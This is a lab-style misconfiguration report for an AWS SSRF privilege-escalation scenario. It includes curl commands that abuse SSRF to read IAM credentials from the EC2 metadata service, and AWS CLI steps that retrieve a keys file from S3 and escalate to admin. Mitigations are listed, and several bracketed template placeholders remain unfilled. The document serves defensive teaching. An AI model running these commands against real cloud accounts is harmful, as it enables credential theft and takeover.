# [ec2_ssrf] — Misconfiguration Report

## Environment Overview

The environment consists of several AWS services inside a single VPC that together create an exploitable attack path.

IAM User (Solus) — Initial user with limited permissions that allow enumeration of Lambda functions.

Lambda Function — Contains hardcoded AWS credentials belonging to another IAM user.

EC2 Instance — Runs a web application vulnerable to Server-Side Request Forgery (SSRF) and has an attached IAM role.

S3 Bucket — Private bucket containing additional credentials that allow further privilege escalation.

The attacker moves through these resources by abusing misconfigurations until they gain sufficient permissions to invoke the target Lambda function.
- **[Principal 1]** — Description of the starting user/role and its initial permissions.
- **[Principal 2]** — Description of an intermediate role and its capabilities.
- **[Service/Function]** — Description of the vulnerable service or function and what it does.
- **[Sensitive Resource]** — Description of the target secret, data, or resource to be exfiltrated.

---

## Attack Chain Summary

```text
IAM User (Solus)
      ↓ discovers credentials in
Lambda Function
      ↓ uses credentials as
IAM User (Wrex)
      ↓ exploits
EC2 Web Application (SSRF)
      ↓ retrieves
EC2 Metadata Service (IMDSv1)
      ↓ obtains
IAM Role Credentials
      ↓ accesses
Private S3 Bucket
      ↓ retrieves
Admin Credentials (Shepard)
      ↓ invokes
Target Lambda Function
```

### Exploit Steps

1. The attacker begins with access as the IAM user Solus.
2. They enumerate Lambda functions and discover a function containing hardcoded AWS credentials.
3. Using these credentials, the attacker assumes the identity of IAM user Wrex.
4. As Wrex, they identify an EC2 instance hosting a vulnerable web application.
5. The application contains a SSRF vulnerability through a URL parameter, allowing the attacker to force the server to make internal requests.
6. The attacker uses SSRF to query the EC2 metadata service (169.254.169.254) and retrieve IAM role credentials.
7. Using these credentials, the attacker accesses a private S3 bucket containing additional AWS credentials for an administrative user.
8. Finally, the attacker uses the admin credentials to invoke the target Lambda function, completing the attack chain.


### Attacker POV

```bash
# Step 1 – enumerate Lambda functions
aws lambda list-functions

# Step 2 – inspect Lambda configuration
aws lambda get-function --function-name cg-lambda-XXXX

# Step 3 – configure stolen credentials
aws configure --profile wrex

# Step 4 – exploit SSRF vulnerability
curl "http://<ec2-ip>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Step 5 – retrieve role credentials
curl "http://<ec2-ip>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>"

# Step 6 – use credentials to access S3
aws s3 ls

# Step 7 – retrieve additional credentials
aws s3 cp s3://<bucket-name>/keys.txt .

# Step 8 – invoke Lambda function
aws lambda invoke --function-name cg-lambda-XXXX output.txt
```

---

## Misconfiguration Findings

### 1. [EC2 SSRF Vulnerability]

**What:** [The EC2 instance hosts a web application that allows user-controlled input in a URL parameter. The application does not validate or restrict outbound requests, allowing attackers to trigger server-side requests to internal resources such as the EC2 metadata service.]

```[language]
# Example vulnerable request
http://<ec2-ip>/?url=http://169.254.169.254/latest/meta-data/
```

[Because the application performs the request on behalf of the attacker, internal AWS services that should not be reachable from the internet become accessible.]

**Mitigation:**

- Validate and sanitize all user-supplied URLs.
- Implement an allowlist of permitted external domains.
- Block requests to internal IP ranges such as 169.254.169.254.

**Why bother:** [SSRF vulnerabilities can allow attackers to access internal services and retrieve sensitive information such as IAM credentials, which can lead to full cloud environment compromise.]

---

### 2. [IMDSv1 Enabled on EC2]

**What:** [The EC2 instance uses Instance Metadata Service Version 1 (IMDSv1), which allows unauthenticated HTTP requests to retrieve instance metadata and IAM credentials.]

```[language]
# Without session tokens, attackers exploiting SSRF can easily retrieve credentials by querying:
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

[Explain how this combines with other findings or enables the attack path.]

**Mitigation:**

- Enforce IMDSv2 by requiring metadata tokens.

**Why bother:** [One to two sentences on the business/security impact if left unaddressed.]

---

### 3. [Credentials Stored in S3 Bucket]

**What:** [The S3 bucket contains AWS credentials that allow privilege escalation to a more powerful IAM user.

Because the attacker already obtained IAM credentials from the EC2 metadata service, they are able to access the bucket and retrieve additional secrets.]

**Mitigation:**

- Never store plaintext credentials in S3.
- Use AWS Secrets Manager or Parameter Store for secret management.
- Restrict S3 access using least privilege IAM policies.

**Why bother:** [Storing credentials in S3 creates an easy privilege escalation path if any role with S3 access becomes compromised.]

---

## Severity & Impact

| Factor               | Reality                                                          |
| -------------------- | ---------------------------------------------------------------- |
| Skill Required       | Medium — attacker must understand SSRF and AWS metadata services |
| Exploit Time         | Low — attack can be performed with a few HTTP requests           |
| Detection Likelihood | Low — metadata access often appears as normal traffic            |
| Data Obtained        | IAM credentials and administrative AWS access                    |
| Blast Radius         | Entire AWS environment                                           |

[This attack chain allows an external attacker to escalate from a low-privileged user to administrative access through multiple misconfigurations.]

---

## Bottom Line

[This scenario demonstrates how multiple cloud misconfigurations can combine into a critical attack chain. An SSRF vulnerability in an EC2 web application allows access to the instance metadata service, which exposes IAM credentials. Those credentials enable access to an S3 bucket containing further secrets, ultimately allowing full administrative access to the AWS environment. Implementing IMDSv2, securing secrets, and validating user input would significantly reduce the risk of this attack.]
